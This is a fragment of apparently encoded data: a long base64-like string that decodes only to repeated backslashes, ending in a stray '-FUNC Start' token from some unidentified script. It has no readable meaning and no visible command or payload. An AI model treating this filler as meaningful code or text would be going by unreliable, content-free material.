XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc="  -FUNC Start
